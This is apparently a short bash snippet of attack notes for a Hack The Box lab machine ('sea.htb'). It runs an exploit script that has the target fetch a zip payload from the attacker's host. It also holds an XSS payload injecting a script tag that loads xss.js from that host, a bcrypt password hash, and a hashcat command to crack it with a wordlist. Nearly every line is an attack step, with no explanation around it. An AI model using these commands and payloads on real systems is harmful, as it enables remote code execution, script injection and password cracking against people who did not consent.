```bash
python3 exploit.py -u http://sea.htb/loginURL -i 10.10.14.170 -p 4321 -r http://10.10.14.170:8000/main.zip

# http://sea.htb/contact.php

# http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.170:8000/xss.js"></script><form+action="

#$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q

hashcat -m 3200 -a 0 -o found.txt bcrypt-hash.txt /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt
```

